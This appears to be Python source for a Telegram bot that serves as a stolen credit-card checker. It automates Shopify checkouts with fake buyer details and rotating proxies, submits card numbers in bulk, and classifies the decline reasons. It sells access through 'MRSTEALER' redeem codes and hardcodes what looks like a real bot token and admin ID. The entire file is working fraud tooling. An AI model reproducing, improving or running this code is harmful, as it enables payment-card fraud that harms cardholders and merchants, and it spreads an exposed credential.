import json
import random
import string
import re
import os
import time
import asyncio
from urllib.parse import urlparse, parse_qs
from faker import Faker
import httpx

fake = Faker()

# Headers for requests
HEADERS_BASE = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

def capture(data, first, last):
    """Extract data between two strings"""
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except (ValueError, TypeError):
        return None

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open("proxy.txt", "r") as file:
            proxies = file.read().splitlines()
            random_proxy = random.choice(proxies)
            proxy_parts = random_proxy.split(":")
            if len(proxy_parts) >= 4:
                ip, port, username, password = proxy_parts[0], proxy_parts[1], proxy_parts[2], proxy_parts[3]
                proxy_url = f"http://{username}:{password}@{ip}:{port}"
                return proxy_url
            else:
                return None
    except Exception as e:
        print(f"Error loading proxy: {e}")
        return None

def generate_random_string(length):
    """Generate a random string of specified length"""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def save_debug_response(response_text, prefix="debug"):
    """Save response text to a file for debugging"""
    try:
        debug_dir = "debug_responses"
        os.makedirs(debug_dir, exist_ok=True)
        timestamp = int(time.time())
        filename = f"{debug_dir}/{prefix}_{timestamp}.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(response_text)
        print(f"Debug response saved to {filename}")
        return filename
    except Exception as e:
        print(f"Error saving debug response: {e}")
        return None

async def get_product_data(url, session):
    """Fetch product data from the Shopify store's products.json endpoint"""
    try:
        # Parse the URL to get the base domain
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Fetch products.json
        products_url = f"{base_url}/products.json"
        response = await session.get(products_url)
        
        if response.status_code != 200:
            print(f"Failed to fetch products: {response.status_code}")
            return None
        
        # Parse the JSON response
        products_data = response.json()
        return products_data
    except Exception as e:
        print(f"Error fetching product data: {e}")
        return None

async def find_lowest_price_variant(products_data):
    """Find the variant with the lowest price from all products"""
    if not products_data or 'products' not in products_data:
        return None
    
    lowest_price = float('inf')
    lowest_variant = None
    
    for product in products_data['products']:
        for variant in product['variants']:
            # Check if variant is available
            if variant.get('available', False):
                # Convert price to float for comparison
                try:
                    price = float(variant['price'])
                    if price < lowest_price:
                        lowest_price = price
                        lowest_variant = {
                            'product_id': product['id'],
                            'variant_id': variant['id'],
                            'title': product['title'],
                            'variant_title': variant['title'],
                            'price': price
                        }
                except (ValueError, KeyError):
                    continue
    
    return lowest_variant

async def find_min_one_dollar_variant(products_data):
    """Find the first variant with a price of $1 or more from all products"""
    if not products_data or 'products' not in products_data:
        return None
    
    min_price_variant = None
    min_price = float('inf')
    
    for product in products_data['products']:
        for variant in product['variants']:
            # Check if variant is available
            if variant.get('available', False):
                # Convert price to float for comparison
                try:
                    price = float(variant['price'])
                    # Only consider variants with price >= 1.0
                    if price >= 1.0 and price < min_price:
                        min_price = price
                        min_price_variant = {
                            'product_id': product['id'],
                            'variant_id': variant['id'],
                            'title': product['title'],
                            'variant_title': variant['title'],
                            'price': price
                        }
                except (ValueError, KeyError):
                    continue
    
    return min_price_variant

async def get_checkout_tokens(url_base, variant_id, session):
    """Get the checkout token and other tokens by adding the product to cart"""
    try:
        # Add product to cart
        cart_url = f"{url_base}/cart/{variant_id}:1"
        params = {
            "traffic_source": "buy_now",
            "properties": "JTdCJTIyX192ZXJpZmljYXRpb24lMjIlM0ElMjJ2YWxpZCUyMiU3RA=="
        }
        
        print(f"Adding product to cart: {cart_url}")
        checkout_request = await session.get(cart_url, params=params, follow_redirects=True)
        
        # Get the checkout URL which contains the token
        checkout_url = str(checkout_request.url)
        checkout_text = checkout_request.text
        
        # Extract checkout token from URL
        checkout_token = None
        if "/cn/" in checkout_url:
            checkout_token = checkout_url.split("/cn/")[1].split("?")[0]
            print(f"Extracted token from URL: {checkout_token}")
        else:
            # Generate random token as fallback
            checkout_token = generate_random_string(10)
            print(f"Generated random token as fallback: {checkout_token[:10]}...")
        
        # Extract other tokens from checkout page
        tokens = {}
        tokens['checkout_token'] = checkout_token
        
        # Extract session token
        session_token = capture(checkout_text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
        if session_token:
            tokens['session_token'] = session_token
            print(f"Found session token: {session_token[:10]}...")
        
        # Extract queue token
        queue_token = capture(checkout_text, 'queueToken&quot;:&quot;', '&quot;')
        if queue_token:
            tokens['queue_token'] = queue_token
            print(f"Found queue token: {queue_token[:10]}...")
        
        # Extract stable ID
        stable_id = capture(checkout_text, 'stableId&quot;:&quot;', '&quot;')
        if stable_id:
            tokens['stable_id'] = stable_id
            print(f"Found stable ID: {stable_id[:10]}...")
        
        # Extract payment method identifier
        payment_method_id = capture(checkout_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        if payment_method_id:
            tokens['payment_method_id'] = payment_method_id
            print(f"Found payment method ID: {payment_method_id[:10]}...")
        
        # Extract payment gateway
        payment_gateway = capture(checkout_text, 'data-select-gateway="', '"')
        if payment_gateway:
            tokens['payment_gateway'] = payment_gateway
            print(f"Found payment gateway: {payment_gateway}")
        else:
            # Try alternative pattern
            payment_gateway = capture(checkout_text, 'data-gateway-name="', '"')
            if payment_gateway:
                tokens['payment_gateway'] = payment_gateway
                print(f"Found payment gateway: {payment_gateway}")
            else:
                # Default gateway
                tokens['payment_gateway'] = "71605395"
                print(f"Using default payment gateway: {tokens['payment_gateway']}")
        
        return checkout_url, tokens
    except Exception as e:
        print(f"Error getting checkout tokens: {e}")
        return None, {}

async def process_checkout(url, checkout_url, tokens, card, month, year, cvv, session):
    """Process the checkout with the provided card details"""
    try:
        # Parse the URL to get the base domain
        parsed_url = urlparse(url)
        url_base = f"{parsed_url.scheme}://{parsed_url.netloc}"
        domain = parsed_url.netloc
        
        print(f"Starting checkout process for {url_base}")
        
        # Generate customer information
        name = "Test" + str(random.randint(100, 999))
        last = "User" + str(random.randint(100, 999))
        r = str(random.randint(100, 999))
        street = f"{r} W {r} ND ST"
        
        # Set location based on URL
        city = "New York"
        state = "New York"
        statecode = "NY"
        country = "United States"
        countrycode = "US"
        zip_ = random.randint(10004, 10033)
        phone = f"1{random.randint(100, 999)}{random.randint(100, 999)}{random.randint(100, 999)}"
        
        print(f"Using shipping address: {name} {last}, {street}, {city}, {state} {zip_}, {country}")
        
        # Submit shipping information
        data_ship = {
            "_method": "patch",
            "authenticity_token": tokens['checkout_token'],
            "previous_step": "contact_information",
            "step": "shipping_method",
            "checkout[email]": fake.email(),
            "checkout[buyer_accepts_marketing]": "0",
            "checkout[shipping_address][first_name]": name,
            "checkout[shipping_address][last_name]": last,
            "checkout[shipping_address][address1]": street,
            "checkout[shipping_address][address2]": "",
            "checkout[shipping_address][city]": city,
            "checkout[shipping_address][country]": countrycode,
            "checkout[shipping_address][province]": statecode,
            "checkout[shipping_address][zip]": zip_,
            "checkout[shipping_address][phone]": phone,
            "checkout[remember_me]": "0",
            "checkout[client_details][browser_width]": "1100",
            "checkout[client_details][browser_height]": "700",
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "300",
        }
        
        print(f"Submitting shipping information")
        information_request = await session.post(checkout_url, data=data_ship, follow_redirects=True)
        information_response = information_request.text
        
        # Handle shipping method
        print("Handling shipping method selection")
        await request_shipping_method(session, checkout_url, tokens['checkout_token'], information_response)
        
        # Go to payment method
        params = {"previous_step": "shipping_method", "step": "payment_method"}
        print(f"Navigating to payment method page")
        previous_step_request = await session.get(checkout_url, params=params)
        previous_step_response = previous_step_request.text
        save_debug_response(previous_step_response, "payment_method_page")
        
        # Extract payment gateway if not already found
        if 'payment_gateway' not in tokens or not tokens['payment_gateway']:
            payment_gateway = capture(previous_step_response, 'data-select-gateway="', '"')
            if payment_gateway:
                tokens['payment_gateway'] = payment_gateway
                print(f"Found payment gateway: {payment_gateway}")
            else:
                # Try alternative pattern
                payment_gateway = capture(previous_step_response, 'data-gateway-name="', '"')
                if payment_gateway:
                    tokens['payment_gateway'] = payment_gateway
                    print(f"Found payment gateway: {payment_gateway}")
                else:
                    # Default gateway
                    tokens['payment_gateway'] = "71605395"
                    print(f"Using default payment gateway: {tokens['payment_gateway']}")
        
        # Create payment session with deposit.shopifycs.com
        json_data = {
            "credit_card": {
                "number": card,
                "name": f"{name} {last}",
                "month": int(month),
                "year": int(year),
                "verification_value": cvv,
            },
            "payment_session_scope": domain,
        }
        
        headers = {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": "https://checkout.shopifycs.com",
            "Referer": "https://checkout.shopifycs.com/",
            "User-Agent": HEADERS_BASE["user-agent"],
        }
        
        print("Creating payment session")
        session_pay_request = await session.post(
            "https://deposit.shopifycs.com/sessions",
            json=json_data,
            headers=headers,
            timeout=30
        )
        
        if session_pay_request.status_code != 200:
            print(f"Failed to create payment session: {session_pay_request.status_code}")
            return "Failed", "Failed to create payment session"
        
        session_pay_response = session_pay_request.json()
        s_card = session_pay_response["id"]
        print(f"Successfully created payment session with ID: {s_card[:10]}...")
        
        # Try to find the form action URL
        form_action = capture(previous_step_response, 'form action="', '"')
        if form_action:
            payment_url = form_action
            print(f"Found form action URL: {payment_url}")
        else:
            payment_url = checkout_url
            print(f"Using checkout URL for payment: {payment_url}")
        
        # Prepare payment data
        payment_data = {
            "authenticity_token": tokens['checkout_token'],
            "previous_step": "payment_method",
            "step": "processing",
            "checkout[payment_gateway]": tokens['payment_gateway'],
            "checkout[credit_card][vault]": "false",
            "checkout[different_billing_address]": "false",
            "checkout[total_price]": "0",  # For free products
            "complete": "1",
            "checkout[client_details][browser_width]": "1100",
            "checkout[client_details][browser_height]": "700",
            "checkout[client_details][javascript_enabled]": "1",
            "s": s_card,  # The payment session ID
        }
        
        # Submit payment
        print(f"Submitting payment to {payment_url}")
        payment_request = await session.post(
            payment_url,
            data=payment_data,
            follow_redirects=True
        )
        
        payment_response = payment_request.text
        payment_response_url = str(payment_request.url)
        
        save_debug_response(payment_response, "payment_direct_response")
        
        # Check for card declined or other payment responses in the HTML
        if "card was declined" in payment_response.lower() or "CARD_DECLINED" in payment_response:
            return "Failed", "CARD_DECLINED"
        
        if "insufficient funds" in payment_response.lower():
            return "Failed", "INSUFFICIENT_FUNDS"
        
        if "card number is invalid" in payment_response.lower():
            return "Failed", "INVALID_CARD_NUMBER"
        
        if "card has expired" in payment_response.lower():
            return "Failed", "EXPIRED_CARD"
        
        if "security code is invalid" in payment_response.lower() or "cvv" in payment_response.lower():
            return "Failed", "INVALID_CVV"
        
        # Check for processing page
        if "processing" in payment_response_url.lower():
            print("Payment is processing, waiting for result...")
            await asyncio.sleep(3)
            
            # Check processing status
            processing_request = await session.get(payment_response_url)
            processing_response = processing_request.text
            save_debug_response(processing_response, "payment_processing_response")
            
            # Check for success indicators
            if "thank you" in processing_response.lower() or "order confirmed" in processing_response.lower():
                return "Success", "Payment approved"
            
            # Check for failure indicators
            if "card was declined" in processing_response.lower() or "CARD_DECLINED" in processing_response:
                return "Failed", "CARD_DECLINED"
        
        # Check for success indicators in the initial response
        if "thank you" in payment_response.lower() or "order confirmed" in payment_response.lower():
            return "Success", "Payment approved"
        
        # If we get here, try to extract any payment-related message
        payment_message = extract_payment_message(payment_response)
        if payment_message:
            if "declined" in payment_message.lower():
                return "Failed", "CARD_DECLINED"
            return "Failed", payment_message
        
        # If we can't determine the exact status, try the alternative GraphQL approach
        print("Trying alternative GraphQL approach for payment status")
        status, message = await try_graphql_payment_status(url_base, tokens, s_card, session)
        if status != "Unknown":
            return status, message
        
        # If all else fails, return the HTTP status
        return "Failed", f"Payment status: payment_related, Message: {payment_request.status_code}"
            
    except Exception as e:
        print(f"Exception during checkout: {e}")
        return "Error", str(e)

async def try_graphql_payment_status(url_base, tokens, s_card, session):
    """Try to get payment status using GraphQL as a fallback"""
    try:
        # Prepare GraphQL headers
        graphql_headers = {
            "accept": "application/json",
            "accept-language": "en-US",
            "content-type": "application/json",
            "origin": url_base,
            "referer": f"{url_base}/",
            "user-agent": HEADERS_BASE["user-agent"],
        }
        
        # Add session token if available
        if 'session_token' in tokens:
            graphql_headers["x-checkout-one-session-token"] = tokens['session_token']
            graphql_headers["x-checkout-web-source-id"] = tokens['checkout_token']
            graphql_headers["x-checkout-web-deploy-stage"] = "production"
            graphql_headers["x-checkout-web-server-handling"] = "fast"
            graphql_headers["x-checkout-web-server-rendering"] = "no"
        
        # Generate attempt token
        attempt_token = f"{tokens['checkout_token']}-{generate_random_string(10)}"
        
        # Prepare GraphQL query for SubmitForCompletion
        submit_query = """
        mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
          submitForCompletion(input: $input, attemptToken: $attemptToken) {
            __typename
          }
        }
        """
        
        # Prepare variables for GraphQL query - Fixed structure based on error message
        submit_variables = {
            "input": {
                "sessionInput": {
                    "sessionToken": tokens['session_token']
                },
                "payment": {
                    "totalAmount": {
                        "value": {
                            "amount": "10.00",
                            "currencyCode": "USD"
                        }
                    },
                    "paymentLines": [{
                        "amount": {
                            "value": {
                                "amount": "10.00",
                                "currencyCode": "USD"
                            }
                        },
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "sessionId": s_card,
                                "paymentMethodIdentifier": tokens.get('payment_method_id', 'shopify_payments'),
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": "123 Test St",
                                        "address2": "",
                                        "city": "New York",
                                        "countryCode": "US",
                                        "postalCode": "10001",
                                        "firstName": "Test",
                                        "lastName": "User",
                                        "phone": ""
                                    }
                                }
                            }
                        }
                    }]
                }
            },
            "attemptToken": attempt_token
        }
        
        # Make GraphQL request for SubmitForCompletion
        graphql_url = f"{url_base}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
        print(f"Submitting payment using GraphQL")
        
        submit_request = await session.post(
            graphql_url,
            headers=graphql_headers,
            json={
                "query": submit_query,
                "variables": submit_variables,
                "operationName": "SubmitForCompletion"
            }
        )
        
        submit_response = submit_request.json()
        save_debug_response(json.dumps(submit_response, indent=2), "submit_completion_response")
        
        # Check for errors in the response
        if "errors" in submit_response and len(submit_response["errors"]) > 0:
            for error in submit_response["errors"]:
                error_message = error.get("message", "")
                if "CARD_DECLINED" in error_message:
                    return "Failed", "CARD_DECLINED"
                if "declined" in error_message.lower():
                    return "Failed", "CARD_DECLINED"
                if "insufficient" in error_message.lower():
                    return "Failed", "INSUFFICIENT_FUNDS"
                if "invalid" in error_message.lower() and "card" in error_message.lower():
                    return "Failed", "INVALID_CARD_NUMBER"
                if "expired" in error_message.lower():
                    return "Failed", "EXPIRED_CARD"
                if "cvv" in error_message.lower() or "security code" in error_message.lower():
                    return "Failed", "INVALID_CVV"
        
        return "Unknown", "Could not determine payment status from GraphQL"
    except Exception as e:
        print(f"Error in GraphQL fallback: {e}")
        return "Unknown", "Error in GraphQL fallback"

def extract_payment_message(html_content):
    """Extract payment-related messages from HTML content"""
    # Try to find common payment error message patterns
    patterns = [
        r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
        r'<span[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</span>',
        r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
        r'data-error-message="([^"]*)"',
        r'class="notice error"[^>]*>(.*?)</div>',
        r'class="error-message"[^>]*>(.*?)</div>',
        r'class="message"[^>]*>(.*?)</div>'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.DOTALL)
        if matches:
            # Clean up the message
            message = re.sub(r'<[^>]*>', ' ', matches[0])
            message = re.sub(r'\s+', ' ', message).strip()
            if message:
                return message
    
    # Look for payment-related keywords
    payment_keywords = ["payment", "card", "credit", "declined", "failed", "error", "invalid"]
    for keyword in payment_keywords:
        pattern = r'([^.!?]*' + keyword + r'[^.!?]*[.!?])'
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        if matches:
            # Clean up the message
            message = re.sub(r'<[^>]*>', ' ', matches[0])
            message = re.sub(r'\s+', ' ', message).strip()
            if message:
                return message
    
    return None

async def request_shipping_method(session, url_checkout, token, information_response):
    """Request shipping method during checkout"""
    data = {
        "_method": "patch",
        "authenticity_token": token,
        "previous_step": "contact_information",
        "step": "shipping_method",
        "checkout[client_details][browser_width]": "1100",
        "checkout[client_details][browser_height]": "1129",
        "checkout[client_details][javascript_enabled]": "1",
        "checkout[client_details][color_depth]": "24",
        "checkout[client_details][java_enabled]": "false",
        "checkout[client_details][browser_tz]": "300",
    }
    
    for _ in range(3):
        shipping = find_shipping_method(information_response)
        if shipping:
            break

        shipping = "shopify-Economy-5"  # default shipping method
        data["checkout[shipping_rate][id]"] = shipping
        shipping_request = await session.post(
            url_checkout,
            data=data,
        )
        information_response = shipping_request.text

    if not shipping:
        raise Exception("Shipping not found after 3 attempts")
    
    data["checkout[shipping_rate][id]"] = shipping
    await session.post(
        url_checkout,
        data=data,
    )

def find_shipping_method(response):
    """Find shipping method from response"""
    ship1 = capture(response, '<div class="radio-wrapper" data-shipping-method="', '">')
    ship2 = capture(response, 'shipping-method="', '"')
    ship3 = capture(response, 'type="radio" value="', '"')
    ship4 = capture(response, 'data-shipping-method="', '"')
    ship5 = capture(response, 'data-backup="', '"')
    ship6 = capture(response, 'shipping-method="', '"')

    return next(
        (ship for ship in [ship1, ship2, ship3, ship4, ship5, ship6] if ship), None
    )

import time
import random
from urllib.parse import urlparse
import httpx
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "7973682201:AAGqS4U3aBOeS0UKKZXeIxFhfNTDa-dWW0Y"
ADMIN_ID = 6473717870

sites_list = []
premium_users = {}
redeemable_codes = {}

# === Shopify Card Checker (dummy logic for now) ===
async def shopify_automation(site_url, card, month, year, cvv):
    start_time = time.perf_counter()
    proxy = get_random_proxy()
    
    try:
        async with httpx.AsyncClient(
            follow_redirects=True,
            timeout=60,
            verify=False,
            proxy=proxy,
            headers=HEADERS_BASE,
        ) as session:
            parsed_url = urlparse(site_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # These helper functions must exist in your project
            products_data = await get_product_data(site_url, session)
            if not products_data:
                return "Error", "Failed to fetch product data", site_url, f"{card}|{month}|{year}|{cvv}", 0
            
            selected_variant = await find_min_one_dollar_variant(products_data)
            if not selected_variant:
                return "Error", "No $1+ product found", site_url, f"{card}|{month}|{year}|{cvv}", 0
            
            checkout_url, tokens = await get_checkout_tokens(base_url, selected_variant['variant_id'], session)
            if not checkout_url or not tokens:
                return "Error", "Failed to get checkout tokens", site_url, f"{card}|{month}|{year}|{cvv}", 0
            
            status, message = await process_checkout(site_url, checkout_url, tokens, card, month, year, cvv, session)
            end_time = time.perf_counter()
            execution_time = end_time - start_time
            
            return status, message, base_url, f"{card}|{month}|{year}|{cvv}", execution_time
        
    except Exception as e:
        return "Error", str(e), site_url, f"{card}|{month}|{year}|{cvv}", 0


# === Bot Commands ===
async def add_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /add <site_url>")
        return
    site = context.args[0]
    if site not in sites_list:
        sites_list.append(site)
        await update.message.reply_text(f"✅ Site added: {site}")
    else:
        await update.message.reply_text("⚠️ Site already exists.")

async def list_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not sites_list:
        await update.message.reply_text("No sites added.")
    else:
        await update.message.reply_text("Sites:\n" + "\n".join(sites_list))

async def remove_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /rmsite <site_url>")
        return
    site = context.args[0]
    if site in sites_list:
        sites_list.remove(site)
        await update.message.reply_text(f"❌ Removed: {site}")
    else:
        await update.message.reply_text("Site not found.")

async def run_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in premium_users or premium_users[user_id] < time.time():
        await update.message.reply_text("❗ You must be a premium user. Use /redeem <code>")
        return

    if not context.args:
        await update.message.reply_text("Usage: /run <card>|<month>|<year>|<cvv>")
        return

    try:
        card, month, year, cvv = context.args[0].split("|")
    except:
        await update.message.reply_text("❌ Invalid format. Use: CARD|MONTH|YEAR|CVV")
        return

    if not sites_list:
        await update.message.reply_text("No sites added. Use /add <site>")
        return

    for site in sites_list:
        status, msg, url, card_info, t = await shopify_automation(site, card, month, year, cvv)
        await update.message.reply_text(
            f"Site: {url}\nCard: {card_info}\nStatus: {status}\nMessage: {msg}\nTime: {t:.2f}s"
        )

async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in premium_users or premium_users[user_id] < time.time():
        await update.message.reply_text("❗ You must be a premium user. Use /redeem <code>")
        return

    document = update.message.document
    if not document:
        await update.message.reply_text("Please send a text file with card details.")
        return

    await update.message.reply_text("Checking... Please wait.")  # Show "Checking..." message

    file = await document.get_file()
    file_content = await file.download_as_bytearray()

    try:
        card_details = file_content.decode("utf-8").splitlines()
        if not card_details:
            await update.message.reply_text("No card details found in the file.")
            return

        for card_info in card_details:
            if "|" not in card_info:
                continue

            card, month, year, cvv = card_info.split("|")
            for site in sites_list:
                status, msg, url, card_info, t = await shopify_automation(site, card, month, year, cvv)
                await update.message.reply_text(
                    f"Card: {card_info}\nStatus: {status} 🎲\nMessage: {msg}\nTime: {t:.2f}s"
                )
    except Exception as e:
        await update.message.reply_text(f"Error processing file: {str(e)}")

def generate_code():
    return f"MRSTEALER-{random.randint(1000,9999)}-{random.randint(100,999)}-{random.choice(['X','Z','A'])}"

async def generate_code_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    code = generate_code()
    redeemable_codes[code] = {"duration": 3600, "quantity": 5}
    await update.message.reply_text(f"✅ Code generated:\n`{code}`", parse_mode="Markdown")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = context.args[0] if context.args else ""
    if code not in redeemable_codes:
        await update.message.reply_text("❌ Invalid code.")
        return
    premium_users[update.message.from_user.id] = time.time() + 3600
    await update.message.reply_text("✅ You are now a premium user.")

# === Start the Bot ===
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("add", add_site))
    app.add_handler(CommandHandler("list", list_sites))
    app.add_handler(CommandHandler("rmsite", remove_site))
    app.add_handler(CommandHandler("run", run_check))
    app.add_handler(CommandHandler("code", generate_code_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), mass_check))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
